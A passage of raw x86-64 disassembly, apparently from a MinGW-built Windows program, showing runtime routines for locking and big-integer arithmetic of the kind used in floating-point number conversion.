  409b7c:	ff d0                	call   *%rax
  409b7e:	89 05 3c 6f 15 00    	mov    %eax,0x156f3c(%rip)        # 0x560ac0
  409b84:	89 d8                	mov    %ebx,%eax
  409b86:	c7 05 40 32 15 00 01 	movl   $0x1,0x153240(%rip)        # 0x55cdd0
  409b8d:	00 00 00 
  409b90:	48 83 c4 28          	add    $0x28,%rsp
  409b94:	5b                   	pop    %rbx
  409b95:	5e                   	pop    %rsi
  409b96:	c3                   	ret
  409b97:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  409b9e:	00 00 
  409ba0:	c7 05 26 32 15 00 00 	movl   $0x0,0x153226(%rip)        # 0x55cdd0
  409ba7:	00 00 00 
  409baa:	eb 9c                	jmp    0x409b48
  409bac:	0f 1f 40 00          	nopl   0x0(%rax)
  409bb0:	48 83 ec 28          	sub    $0x28,%rsp
  409bb4:	8b 15 1a 32 15 00    	mov    0x15321a(%rip),%edx        # 0x55cdd4
  409bba:	85 d2                	test   %edx,%edx
  409bbc:	75 12                	jne    0x409bd0
  409bbe:	8b 05 fc 6e 15 00    	mov    0x156efc(%rip),%eax        # 0x560ac0
  409bc4:	48 83 c4 28          	add    $0x28,%rsp
  409bc8:	c3                   	ret
  409bc9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  409bd0:	e8 0b ba ff ff       	call   0x4055e0
  409bd5:	48 8d 15 f7 3e 15 00 	lea    0x153ef7(%rip),%rdx        # 0x55dad3
  409bdc:	48 89 c1             	mov    %rax,%rcx
  409bdf:	ff 15 a7 89 15 00    	call   *0x1589a7(%rip)        # 0x56258c
  409be5:	48 85 c0             	test   %rax,%rax
  409be8:	74 18                	je     0x409c02
  409bea:	ff d0                	call   *%rax
  409bec:	ba 01 00 00 00       	mov    $0x1,%edx
  409bf1:	89 05 c9 6e 15 00    	mov    %eax,0x156ec9(%rip)        # 0x560ac0
  409bf7:	89 15 d7 31 15 00    	mov    %edx,0x1531d7(%rip)        # 0x55cdd4
  409bfd:	48 83 c4 28          	add    $0x28,%rsp
  409c01:	c3                   	ret
  409c02:	8b 05 b8 6e 15 00    	mov    0x156eb8(%rip),%eax        # 0x560ac0
  409c08:	31 d2                	xor    %edx,%edx
  409c0a:	eb eb                	jmp    0x409bf7
  409c0c:	90                   	nop
  409c0d:	90                   	nop
  409c0e:	90                   	nop
  409c0f:	90                   	nop
  409c10:	56                   	push   %rsi
  409c11:	53                   	push   %rbx
  409c12:	48 83 ec 28          	sub    $0x28,%rsp
  409c16:	8b 05 24 78 15 00    	mov    0x157824(%rip),%eax        # 0x561440
  409c1c:	48 63 f1             	movslq %ecx,%rsi
  409c1f:	83 f8 02             	cmp    $0x2,%eax
  409c22:	74 40                	je     0x409c64
  409c24:	85 c0                	test   %eax,%eax
  409c26:	75 66                	jne    0x409c8e
  409c28:	b0 01                	mov    $0x1,%al
  409c2a:	f0 87 05 0f 78 15 00 	lock xchg %eax,0x15780f(%rip)        # 0x561440
  409c31:	85 c0                	test   %eax,%eax
  409c33:	75 4e                	jne    0x409c83
  409c35:	48 8d 0d 24 78 15 00 	lea    0x157824(%rip),%rcx        # 0x561460
  409c3c:	48 8b 1d 79 89 15 00 	mov    0x158979(%rip),%rbx        # 0x5625bc
  409c43:	ff d3                	call   *%rbx
  409c45:	48 8d 0d 3c 78 15 00 	lea    0x15783c(%rip),%rcx        # 0x561488
  409c4c:	ff d3                	call   *%rbx
  409c4e:	48 8d 0d ab 00 00 00 	lea    0xab(%rip),%rcx        # 0x409d00
  409c55:	e8 06 ab ff ff       	call   0x404760
  409c5a:	c7 05 dc 77 15 00 02 	movl   $0x2,0x1577dc(%rip)        # 0x561440
  409c61:	00 00 00 
  409c64:	48 8d 14 b6          	lea    (%rsi,%rsi,4),%rdx
  409c68:	48 8d 05 f1 77 15 00 	lea    0x1577f1(%rip),%rax        # 0x561460
  409c6f:	48 8d 0c d0          	lea    (%rax,%rdx,8),%rcx
  409c73:	48 8b 05 c2 88 15 00 	mov    0x1588c2(%rip),%rax        # 0x56253c
  409c7a:	48 83 c4 28          	add    $0x28,%rsp
  409c7e:	5b                   	pop    %rbx
  409c7f:	5e                   	pop    %rsi
  409c80:	48 ff e0             	rex.W jmp *%rax
  409c83:	83 f8 02             	cmp    $0x2,%eax
  409c86:	74 36                	je     0x409cbe
  409c88:	8b 05 b2 77 15 00    	mov    0x1577b2(%rip),%eax        # 0x561440
  409c8e:	83 f8 01             	cmp    $0x1,%eax
  409c91:	75 1f                	jne    0x409cb2
  409c93:	48 8b 1d 9a 89 15 00 	mov    0x15899a(%rip),%rbx        # 0x562634
  409c9a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  409ca0:	b9 01 00 00 00       	mov    $0x1,%ecx
  409ca5:	ff d3                	call   *%rbx
  409ca7:	8b 05 93 77 15 00    	mov    0x157793(%rip),%eax        # 0x561440
  409cad:	83 f8 01             	cmp    $0x1,%eax
  409cb0:	74 ee                	je     0x409ca0
  409cb2:	83 f8 02             	cmp    $0x2,%eax
  409cb5:	74 ad                	je     0x409c64
  409cb7:	48 83 c4 28          	add    $0x28,%rsp
  409cbb:	5b                   	pop    %rbx
  409cbc:	5e                   	pop    %rsi
  409cbd:	c3                   	ret
  409cbe:	c7 05 78 77 15 00 02 	movl   $0x2,0x157778(%rip)        # 0x561440
  409cc5:	00 00 00 
  409cc8:	eb 9a                	jmp    0x409c64
  409cca:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  409cd0:	83 3d 69 77 15 00 02 	cmpl   $0x2,0x157769(%rip)        # 0x561440
  409cd7:	74 07                	je     0x409ce0
  409cd9:	f3 c3                	repz ret
  409cdb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  409ce0:	48 63 c9             	movslq %ecx,%rcx
  409ce3:	48 8d 05 76 77 15 00 	lea    0x157776(%rip),%rax        # 0x561460
  409cea:	48 8d 14 89          	lea    (%rcx,%rcx,4),%rdx
  409cee:	48 8d 0c d0          	lea    (%rax,%rdx,8),%rcx
  409cf2:	48 8b 05 d3 88 15 00 	mov    0x1588d3(%rip),%rax        # 0x5625cc
  409cf9:	48 ff e0             	rex.W jmp *%rax
  409cfc:	0f 1f 40 00          	nopl   0x0(%rax)
  409d00:	53                   	push   %rbx
  409d01:	48 83 ec 20          	sub    $0x20,%rsp
  409d05:	b8 03 00 00 00       	mov    $0x3,%eax
  409d0a:	f0 87 05 2f 77 15 00 	lock xchg %eax,0x15772f(%rip)        # 0x561440
  409d11:	83 f8 02             	cmp    $0x2,%eax
  409d14:	74 0a                	je     0x409d20
  409d16:	48 83 c4 20          	add    $0x20,%rsp
  409d1a:	5b                   	pop    %rbx
  409d1b:	c3                   	ret
  409d1c:	0f 1f 40 00          	nopl   0x0(%rax)
  409d20:	48 8b 1d 0d 88 15 00 	mov    0x15880d(%rip),%rbx        # 0x562534
  409d27:	48 8d 0d 32 77 15 00 	lea    0x157732(%rip),%rcx        # 0x561460
  409d2e:	ff d3                	call   *%rbx
  409d30:	48 8d 0d 51 77 15 00 	lea    0x157751(%rip),%rcx        # 0x561488
  409d37:	48 89 d8             	mov    %rbx,%rax
  409d3a:	48 83 c4 20          	add    $0x20,%rsp
  409d3e:	5b                   	pop    %rbx
  409d3f:	48 ff e0             	rex.W jmp *%rax
  409d42:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
  409d49:	1f 84 00 00 00 00 00 
  409d50:	57                   	push   %rdi
  409d51:	56                   	push   %rsi
  409d52:	53                   	push   %rbx
  409d53:	48 83 ec 20          	sub    $0x20,%rsp
  409d57:	89 ce                	mov    %ecx,%esi
  409d59:	31 c9                	xor    %ecx,%ecx
  409d5b:	e8 b0 fe ff ff       	call   0x409c10
  409d60:	83 fe 09             	cmp    $0x9,%esi
  409d63:	7f 1c                	jg     0x409d81
  409d65:	48 8d 05 74 6d 15 00 	lea    0x156d74(%rip),%rax        # 0x560ae0
  409d6c:	48 63 d6             	movslq %esi,%rdx
  409d6f:	48 8b 1c d0          	mov    (%rax,%rdx,8),%rbx
  409d73:	48 85 db             	test   %rbx,%rbx
  409d76:	74 5c                	je     0x409dd4
  409d78:	48 8b 0b             	mov    (%rbx),%rcx
  409d7b:	48 89 0c d0          	mov    %rcx,(%rax,%rdx,8)
  409d7f:	eb 33                	jmp    0x409db4
  409d81:	89 f1                	mov    %esi,%ecx
  409d83:	bf 01 00 00 00       	mov    $0x1,%edi
  409d88:	d3 e7                	shl    %cl,%edi
  409d8a:	8d 47 ff             	lea    -0x1(%rdi),%eax
  409d8d:	48 98                	cltq
  409d8f:	48 8d 0c 85 27 00 00 	lea    0x27(,%rax,4),%rcx
  409d96:	00 
  409d97:	48 c1 e9 03          	shr    $0x3,%rcx
  409d9b:	8d 09                	lea    (%rcx),%ecx
  409d9d:	48 c1 e1 03          	shl    $0x3,%rcx
  409da1:	e8 2a 0b 00 00       	call   0x40a8d0
  409da6:	48 85 c0             	test   %rax,%rax
  409da9:	48 89 c3             	mov    %rax,%rbx
  409dac:	74 1b                	je     0x409dc9
  409dae:	89 73 08             	mov    %esi,0x8(%rbx)
  409db1:	89 7b 0c             	mov    %edi,0xc(%rbx)
  409db4:	31 c9                	xor    %ecx,%ecx
  409db6:	e8 15 ff ff ff       	call   0x409cd0
  409dbb:	c7 43 14 00 00 00 00 	movl   $0x0,0x14(%rbx)
  409dc2:	c7 43 10 00 00 00 00 	movl   $0x0,0x10(%rbx)
  409dc9:	48 89 d8             	mov    %rbx,%rax
  409dcc:	48 83 c4 20          	add    $0x20,%rsp
  409dd0:	5b                   	pop    %rbx
  409dd1:	5e                   	pop    %rsi
  409dd2:	5f                   	pop    %rdi
  409dd3:	c3                   	ret
  409dd4:	89 f1                	mov    %esi,%ecx
  409dd6:	bf 01 00 00 00       	mov    $0x1,%edi
  409ddb:	48 8b 1d fe 2f 15 00 	mov    0x152ffe(%rip),%rbx        # 0x55cde0
  409de2:	d3 e7                	shl    %cl,%edi
  409de4:	8d 47 ff             	lea    -0x1(%rdi),%eax
  409de7:	48 89 da             	mov    %rbx,%rdx
  409dea:	48 98                	cltq
  409dec:	48 8d 0c 85 27 00 00 	lea    0x27(,%rax,4),%rcx
  409df3:	00 
  409df4:	48 8d 05 45 6d 15 00 	lea    0x156d45(%rip),%rax        # 0x560b40
  409dfb:	48 29 c2             	sub    %rax,%rdx
  409dfe:	48 c1 e9 03          	shr    $0x3,%rcx
  409e02:	48 89 d0             	mov    %rdx,%rax
  409e05:	83 e1 ff             	and    $0xffffffff,%ecx
  409e08:	48 c1 f8 03          	sar    $0x3,%rax
  409e0c:	48 01 c8             	add    %rcx,%rax
  409e0f:	48 3d 20 01 00 00    	cmp    $0x120,%rax
  409e15:	77 86                	ja     0x409d9d
  409e17:	48 8d 04 cb          	lea    (%rbx,%rcx,8),%rax
  409e1b:	48 89 05 be 2f 15 00 	mov    %rax,0x152fbe(%rip)        # 0x55cde0
  409e22:	eb 8a                	jmp    0x409dae
  409e24:	66 66 66 2e 0f 1f 84 	data16 data16 cs nopw 0x0(%rax,%rax,1)
  409e2b:	00 00 00 00 00 
  409e30:	53                   	push   %rbx
  409e31:	48 83 ec 20          	sub    $0x20,%rsp
  409e35:	48 85 c9             	test   %rcx,%rcx
  409e38:	48 89 cb             	mov    %rcx,%rbx
  409e3b:	74 43                	je     0x409e80
  409e3d:	83 79 08 09          	cmpl   $0x9,0x8(%rcx)
  409e41:	7f 2d                	jg     0x409e70
  409e43:	31 c9                	xor    %ecx,%ecx
  409e45:	e8 c6 fd ff ff       	call   0x409c10
  409e4a:	48 63 53 08          	movslq 0x8(%rbx),%rdx
  409e4e:	48 8d 05 8b 6c 15 00 	lea    0x156c8b(%rip),%rax        # 0x560ae0
  409e55:	48 8b 0c d0          	mov    (%rax,%rdx,8),%rcx
  409e59:	48 89 1c d0          	mov    %rbx,(%rax,%rdx,8)
  409e5d:	48 89 0b             	mov    %rcx,(%rbx)
  409e60:	31 c9                	xor    %ecx,%ecx
  409e62:	48 83 c4 20          	add    $0x20,%rsp
  409e66:	5b                   	pop    %rbx
  409e67:	e9 64 fe ff ff       	jmp    0x409cd0
  409e6c:	0f 1f 40 00          	nopl   0x0(%rax)
  409e70:	48 83 c4 20          	add    $0x20,%rsp
  409e74:	5b                   	pop    %rbx
  409e75:	e9 b6 0a 00 00       	jmp    0x40a930
  409e7a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  409e80:	48 83 c4 20          	add    $0x20,%rsp
  409e84:	5b                   	pop    %rbx
  409e85:	c3                   	ret
  409e86:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  409e8d:	00 00 00 
  409e90:	55                   	push   %rbp
  409e91:	57                   	push   %rdi
  409e92:	56                   	push   %rsi
  409e93:	53                   	push   %rbx
  409e94:	48 83 ec 28          	sub    $0x28,%rsp
  409e98:	8b 71 14             	mov    0x14(%rcx),%esi
  409e9b:	45 31 c9             	xor    %r9d,%r9d
  409e9e:	4c 8d 59 18          	lea    0x18(%rcx),%r11
  409ea2:	48 89 cf             	mov    %rcx,%rdi
  409ea5:	49 63 d8             	movslq %r8d,%rbx
  409ea8:	48 63 d2             	movslq %edx,%rdx
  409eab:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  409eb0:	47 8b 14 8b          	mov    (%r11,%r9,4),%r10d
  409eb4:	4c 0f af d2          	imul   %rdx,%r10
  409eb8:	49 01 da             	add    %rbx,%r10
  409ebb:	4c 89 d3             	mov    %r10,%rbx
  409ebe:	47 89 14 8b          	mov    %r10d,(%r11,%r9,4)
  409ec2:	49 83 c1 01          	add    $0x1,%r9
  409ec6:	48 c1 eb 20          	shr    $0x20,%rbx
  409eca:	44 39 ce             	cmp    %r9d,%esi
  409ecd:	7f e1                	jg     0x409eb0
  409ecf:	48 85 db             	test   %rbx,%rbx
  409ed2:	74 12                	je     0x409ee6
  409ed4:	3b 77 0c             	cmp    0xc(%rdi),%esi
  409ed7:	7d 19                	jge    0x409ef2
  409ed9:	48 63 c6             	movslq %esi,%rax
  409edc:	83 c6 01             	add    $0x1,%esi
  409edf:	89 5c 87 18          	mov    %ebx,0x18(%rdi,%rax,4)
  409ee3:	89 77 14             	mov    %esi,0x14(%rdi)
  409ee6:	48 89 f8             	mov    %rdi,%rax
  409ee9:	48 83 c4 28          	add    $0x28,%rsp
  409eed:	5b                   	pop    %rbx
  409eee:	5e                   	pop    %rsi
  409eef:	5f                   	pop    %rdi
  409ef0:	5d                   	pop    %rbp
  409ef1:	c3                   	ret
  409ef2:	8b 4f 08             	mov    0x8(%rdi),%ecx
  409ef5:	83 c1 01             	add    $0x1,%ecx
  409ef8:	e8 53 fe ff ff       	call   0x409d50
  409efd:	48 85 c0             	test   %rax,%rax
  409f00:	48 89 c5             	mov    %rax,%rbp
  409f03:	74 33                	je     0x409f38
  409f05:	48 8d 48 10          	lea    0x10(%rax),%rcx
  409f09:	48 63 47 14          	movslq 0x14(%rdi),%rax
  409f0d:	48 8d 57 10          	lea    0x10(%rdi),%rdx
  409f11:	4c 8d 04 85 08 00 00 	lea    0x8(,%rax,4),%r8
  409f18:	00 
  409f19:	e8 aa 09 00 00       	call   0x40a8c8
  409f1e:	48 89 f9             	mov    %rdi,%rcx
  409f21:	48 89 ef             	mov    %rbp,%rdi
  409f24:	e8 07 ff ff ff       	call   0x409e30
  409f29:	48 63 c6             	movslq %esi,%rax
  409f2c:	83 c6 01             	add    $0x1,%esi
  409f2f:	89 5c 87 18          	mov    %ebx,0x18(%rdi,%rax,4)
  409f33:	89 77 14             	mov    %esi,0x14(%rdi)
  409f36:	eb ae                	jmp    0x409ee6
  409f38:	31 ff                	xor    %edi,%edi
  409f3a:	eb aa                	jmp    0x409ee6
  409f3c:	0f 1f 40 00          	nopl   0x0(%rax)
  409f40:	53                   	push   %rbx
  409f41:	48 83 ec 20          	sub    $0x20,%rsp
  409f45:	89 cb                	mov    %ecx,%ebx
  409f47:	b9 01 00 00 00       	mov    $0x1,%ecx
  409f4c:	e8 ff fd ff ff       	call   0x409d50
  409f51:	48 85 c0             	test   %rax,%rax
  409f54:	74 0a                	je     0x409f60
  409f56:	89 58 18             	mov    %ebx,0x18(%rax)
  409f59:	c7 40 14 01 00 00 00 	movl   $0x1,0x14(%rax)
  409f60:	48 83 c4 20          	add    $0x20,%rsp
  409f64:	5b                   	pop    %rbx
  409f65:	c3                   	ret
  409f66:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  409f6d:	00 00 00 
  409f70:	41 57                	push   %r15
  409f72:	41 56                	push   %r14
  409f74:	41 55                	push   %r13
  409f76:	41 54                	push   %r12
  409f78:	55                   	push   %rbp
  409f79:	57                   	push   %rdi
  409f7a:	56                   	push   %rsi
  409f7b:	53                   	push   %rbx
  409f7c:	48 83 ec 28          	sub    $0x28,%rsp
  409f80:	4c 63 61 14          	movslq 0x14(%rcx),%r12
  409f84:	4c 63 72 14          	movslq 0x14(%rdx),%r14
  409f88:	48 89 cb             	mov    %rcx,%rbx
  409f8b:	49 89 d7             	mov    %rdx,%r15
  409f8e:	45 39 f4             	cmp    %r14d,%r12d
  409f91:	7d 0f                	jge    0x409fa2
  409f93:	44 89 e0             	mov    %r12d,%eax
  409f96:	48 89 d3             	mov    %rdx,%rbx
  409f99:	4d 63 e6             	movslq %r14d,%r12
  409f9c:	49 89 cf             	mov    %rcx,%r15
  409f9f:	4c 63 f0             	movslq %eax,%r14
  409fa2:	31 c9                	xor    %ecx,%ecx
  409fa4:	43 8d 34 34          	lea    (%r12,%r14,1),%esi
  409fa8:	3b 73 0c             	cmp    0xc(%rbx),%esi
  409fab:	0f 9f c1             	setg   %cl
  409fae:	03 4b 08             	add    0x8(%rbx),%ecx
  409fb1:	e8 9a fd ff ff       	call   0x409d50
  409fb6:	48 85 c0             	test   %rax,%rax
  409fb9:	0f 84 b3 00 00 00    	je     0x40a072
  409fbf:	48 63 d6             	movslq %esi,%rdx
  409fc2:	48 8d 78 18          	lea    0x18(%rax),%rdi
  409fc6:	48 8d 6c 90 18       	lea    0x18(%rax,%rdx,4),%rbp
  409fcb:	49 89 f8             	mov    %rdi,%r8
  409fce:	48 39 ef             	cmp    %rbp,%rdi
  409fd1:	73 10                	jae    0x409fe3
  409fd3:	41 c7 00 00 00 00 00 	movl   $0x0,(%r8)
  409fda:	49 83 c0 04          	add    $0x4,%r8
  409fde:	4c 39 c5             	cmp    %r8,%rbp
  409fe1:	77 f0                	ja     0x409fd3
  409fe3:	4c 8d 6b 18          	lea    0x18(%rbx),%r13
  409fe7:	4d 8d 57 18          	lea    0x18(%r15),%r10
  409feb:	4a 8d 5c a3 18       	lea    0x18(%rbx,%r12,4),%rbx
  409ff0:	4f 8d 64 b7 18       	lea    0x18(%r15,%r14,4),%r12
  409ff5:	4d 39 e2             	cmp    %r12,%r10
  409ff8:	73 4e                	jae    0x40a048
  409ffa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  40a000:	45 8b 1a             	mov    (%r10),%r11d
  40a003:	49 83 c2 04          	add    $0x4,%r10
  40a007:	45 85 db             	test   %r11d,%r11d
  40a00a:	74 33                	je     0x40a03f
  40a00c:	48 89 fa             	mov    %rdi,%rdx
  40a00f:	4c 89 e9             	mov    %r13,%rcx
  40a012:	45 31 c9             	xor    %r9d,%r9d
  40a015:	44 8b 01             	mov    (%rcx),%r8d
  40a018:	44 8b 32             	mov    (%rdx),%r14d
  40a01b:	48 83 c1 04          	add    $0x4,%rcx
  40a01f:	4d 0f af c3          	imul   %r11,%r8
  40a023:	4d 01 f0             	add    %r14,%r8
  40a026:	4d 01 c8             	add    %r9,%r8
  40a029:	4d 89 c1             	mov    %r8,%r9
  40a02c:	44 89 02             	mov    %r8d,(%rdx)
  40a02f:	48 83 c2 04          	add    $0x4,%rdx
  40a033:	49 c1 e9 20          	shr    $0x20,%r9
  40a037:	48 39 cb             	cmp    %rcx,%rbx
  40a03a:	77 d9                	ja     0x40a015
  40a03c:	44 89 0a             	mov    %r9d,(%rdx)
  40a03f:	48 83 c7 04          	add    $0x4,%rdi
  40a043:	4d 39 d4             	cmp    %r10,%r12
  40a046:	77 b8                	ja     0x40a000
  40a048:	85 f6                	test   %esi,%esi
  40a04a:	7e 23                	jle    0x40a06f
  40a04c:	44 8b 45 fc          	mov    -0x4(%rbp),%r8d
  40a050:	48 8d 55 fc          	lea    -0x4(%rbp),%rdx
  40a054:	45 85 c0             	test   %r8d,%r8d
  40a057:	74 11                	je     0x40a06a
  40a059:	eb 14                	jmp    0x40a06f
  40a05b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  40a060:	48 83 ea 04          	sub    $0x4,%rdx
  40a064:	8b 0a                	mov    (%rdx),%ecx
  40a066:	85 c9                	test   %ecx,%ecx
  40a068:	75 05                	jne    0x40a06f
  40a06a:	83 ee 01             	sub    $0x1,%esi
  40a06d:	75 f1                	jne    0x40a060
  40a06f:	89 70 14             	mov    %esi,0x14(%rax)
  40a072:	48 83 c4 28          	add    $0x28,%rsp
  40a076:	5b                   	pop    %rbx
  40a077:	5e                   	pop    %rsi
  40a078:	5f                   	pop    %rdi
  40a079:	5d                   	pop    %rbp
  40a07a:	41 5c                	pop    %r12
  40a07c:	41 5d                	pop    %r13
  40a07e:	41 5e                	pop    %r14
  40a080:	41 5f                	pop    %r15
  40a082:	c3                   	ret
  40a083:	66 66 66 66 2e 0f 1f 	data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
  40a08a:	84 00 00 00 00 00 
  40a090:	55                   	push   %rbp
  40a091:	57                   	push   %rdi
  40a092:	56                   	push   %rsi
  40a093:	53                   	push   %rbx
  40a094:	48 83 ec 28          	sub    $0x28,%rsp
  40a098:	89 d0                	mov    %edx,%eax
  40a09a:	48 89 cf             	mov    %rcx,%rdi
  40a09d:	89 d3                	mov    %edx,%ebx
  40a09f:	83 e0 03             	and    $0x3,%eax
  40a0a2:	0f 85 89 00 00 00    	jne    0x40a131
  40a0a8:	c1 fb 02             	sar    $0x2,%ebx
  40a0ab:	85 db                	test   %ebx,%ebx
  40a0ad:	74 51                	je     0x40a100
  40a0af:	48 8b 35 fa 73 15 00 	mov    0x1573fa(%rip),%rsi        # 0x5614b0
  40a0b6:	48 85 f6             	test   %rsi,%rsi
  40a0b9:	75 14                	jne    0x40a0cf
  40a0bb:	e9 c1 00 00 00       	jmp    0x40a181
  40a0c0:	d1 fb                	sar    $1,%ebx
  40a0c2:	74 3c                	je     0x40a100
  40a0c4:	4c 8b 06             	mov    (%rsi),%r8
  40a0c7:	4d 85 c0             	test   %r8,%r8
  40a0ca:	74 44                	je     0x40a110
  40a0cc:	4c 89 c6             	mov    %r8,%rsi
  40a0cf:	f6 c3 01             	test   $0x1,%bl
  40a0d2:	74 ec                	je     0x40a0c0
  40a0d4:	48 89 f2             	mov    %rsi,%rdx
  40a0d7:	48 89 f9             	mov    %rdi,%rcx
  40a0da:	e8 91 fe ff ff       	call   0x409f70
  40a0df:	48 85 c0             	test   %rax,%rax
  40a0e2:	48 89 c5             	mov    %rax,%rbp
  40a0e5:	74 6d                	je     0x40a154
  40a0e7:	48 89 f9             	mov    %rdi,%rcx
  40a0ea:	48 89 ef             	mov    %rbp,%rdi
  40a0ed:	e8 3e fd ff ff       	call   0x409e30
  40a0f2:	d1 fb                	sar    $1,%ebx
  40a0f4:	75 ce                	jne    0x40a0c4
  40a0f6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40a0fd:	00 00 00 
  40a100:	48 89 f8             	mov    %rdi,%rax
  40a103:	48 83 c4 28          	add    $0x28,%rsp
  40a107:	5b                   	pop    %rbx
  40a108:	5e                   	pop    %rsi
  40a109:	5f                   	pop    %rdi
  40a10a:	5d                   	pop    %rbp
  40a10b:	c3                   	ret
  40a10c:	0f 1f 40 00          	nopl   0x0(%rax)
  40a110:	b9 01 00 00 00       	mov    $0x1,%ecx
  40a115:	e8 f6 fa ff ff       	call   0x409c10
  40a11a:	48 8b 2e             	mov    (%rsi),%rbp
  40a11d:	48 85 ed             	test   %rbp,%rbp
  40a120:	74 40                	je     0x40a162
  40a122:	b9 01 00 00 00       	mov    $0x1,%ecx
  40a127:	48 89 ee             	mov    %rbp,%rsi
  40a12a:	e8 a1 fb ff ff       	call   0x409cd0
  40a12f:	eb 9e                	jmp    0x40a0cf
  40a131:	83 e8 01             	sub    $0x1,%eax
  40a134:	48 8d 15 ed 3a 15 00 	lea    0x153aed(%rip),%rdx        # 0x55dc28
  40a13b:	45 31 c0             	xor    %r8d,%r8d
  40a13e:	48 98                	cltq
  40a140:	8b 14 82             	mov    (%rdx,%rax,4),%edx
  40a143:	e8 48 fd ff ff       	call   0x409e90
  40a148:	48 85 c0             	test   %rax,%rax
  40a14b:	48 89 c7             	mov    %rax,%rdi
  40a14e:	0f 85 54 ff ff ff    	jne    0x40a0a8
  40a154:	31 ff                	xor    %edi,%edi
  40a156:	48 89 f8             	mov    %rdi,%rax
  40a159:	48 83 c4 28          	add    $0x28,%rsp
  40a15d:	5b                   	pop    %rbx
  40a15e:	5e                   	pop    %rsi
  40a15f:	5f                   	pop    %rdi
  40a160:	5d                   	pop    %rbp
  40a161:	c3                   	ret
  40a162:	48 89 f2             	mov    %rsi,%rdx
  40a165:	48 89 f1             	mov    %rsi,%rcx
  40a168:	e8 03 fe ff ff       	call   0x409f70
  40a16d:	48 85 c0             	test   %rax,%rax
  40a170:	48 89 c5             	mov    %rax,%rbp
  40a173:	48 89 06             	mov    %rax,(%rsi)
  40a176:	74 dc                	je     0x40a154
  40a178:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
  40a17f:	eb a1                	jmp    0x40a122
  40a181:	b9 01 00 00 00       	mov    $0x1,%ecx
  40a186:	e8 85 fa ff ff       	call   0x409c10
  40a18b:	48 8b 35 1e 73 15 00 	mov    0x15731e(%rip),%rsi        # 0x5614b0
  40a192:	48 85 f6             	test   %rsi,%rsi
  40a195:	74 0f                	je     0x40a1a6
  40a197:	b9 01 00 00 00       	mov    $0x1,%ecx
  40a19c:	e8 2f fb ff ff       	call   0x409cd0
  40a1a1:	e9 29 ff ff ff       	jmp    0x40a0cf
  40a1a6:	b9 71 02 00 00       	mov    $0x271,%ecx
  40a1ab:	e8 90 fd ff ff       	call   0x409f40
  40a1b0:	48 85 c0             	test   %rax,%rax
  40a1b3:	48 89 c6             	mov    %rax,%rsi
  40a1b6:	48 89 05 f3 72 15 00 	mov    %rax,0x1572f3(%rip)        # 0x5614b0
  40a1bd:	74 95                	je     0x40a154
  40a1bf:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
  40a1c6:	eb cf                	jmp    0x40a197
  40a1c8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40a1cf:	00 
  40a1d0:	41 55                	push   %r13
  40a1d2:	41 54                	push   %r12
  40a1d4:	55                   	push   %rbp
  40a1d5:	57                   	push   %rdi
  40a1d6:	56                   	push   %rsi
  40a1d7:	53                   	push   %rbx
  40a1d8:	48 83 ec 28          	sub    $0x28,%rsp
  40a1dc:	48 89 cf             	mov    %rcx,%rdi
  40a1df:	89 d6                	mov    %edx,%esi
  40a1e1:	41 89 d5             	mov    %edx,%r13d
  40a1e4:	44 8b 67 14          	mov    0x14(%rdi),%r12d
  40a1e8:	c1 fe 05             	sar    $0x5,%esi
  40a1eb:	8b 47 0c             	mov    0xc(%rdi),%eax
  40a1ee:	8b 49 08             	mov    0x8(%rcx),%ecx
  40a1f1:	41 01 f4             	add    %esi,%r12d
  40a1f4:	41 8d 5c 24 01       	lea    0x1(%r12),%ebx
  40a1f9:	39 c3                	cmp    %eax,%ebx
  40a1fb:	7e 0c                	jle    0x40a209
  40a1fd:	0f 1f 00             	nopl   (%rax)
  40a200:	01 c0                	add    %eax,%eax
  40a202:	83 c1 01             	add    $0x1,%ecx
  40a205:	39 c3                	cmp    %eax,%ebx
  40a207:	7f f7                	jg     0x40a200
  40a209:	e8 42 fb ff ff       	call   0x409d50
  40a20e:	48 85 c0             	test   %rax,%rax
  40a211:	48 89 c5             	mov    %rax,%rbp
  40a214:	0f 84 85 00 00 00    	je     0x40a29f
  40a21a:	85 f6                	test   %esi,%esi
  40a21c:	4c 8d 48 18          	lea    0x18(%rax),%r9
  40a220:	7e 1c                	jle    0x40a23e
  40a222:	45 31 c0             	xor    %r8d,%r8d
  40a225:	43 c7 04 81 00 00 00 	movl   $0x0,(%r9,%r8,4)
  40a22c:	00 
  40a22d:	49 83 c0 01          	add    $0x1,%r8
  40a231:	44 39 c6             	cmp    %r8d,%esi
  40a234:	7f ef                	jg     0x40a225
  40a236:	8d 46 ff             	lea    -0x1(%rsi),%eax
  40a239:	4c 8d 4c 85 1c       	lea    0x1c(%rbp,%rax,4),%r9
  40a23e:	48 63 47 14          	movslq 0x14(%rdi),%rax
  40a242:	44 89 ea             	mov    %r13d,%edx
  40a245:	4c 8d 47 18          	lea    0x18(%rdi),%r8
  40a249:	83 e2 1f             	and    $0x1f,%edx
  40a24c:	48 8d 74 87 18       	lea    0x18(%rdi,%rax,4),%rsi
  40a251:	74 5d                	je     0x40a2b0
  40a253:	b8 20 00 00 00       	mov    $0x20,%eax
  40a258:	45 31 db             	xor    %r11d,%r11d
  40a25b:	29 d0                	sub    %edx,%eax
  40a25d:	0f 1f 00             	nopl   (%rax)
  40a260:	45 8b 10             	mov    (%r8),%r10d
  40a263:	89 d1                	mov    %edx,%ecx
  40a265:	41 d3 e2             	shl    %cl,%r10d
  40a268:	89 c1                	mov    %eax,%ecx
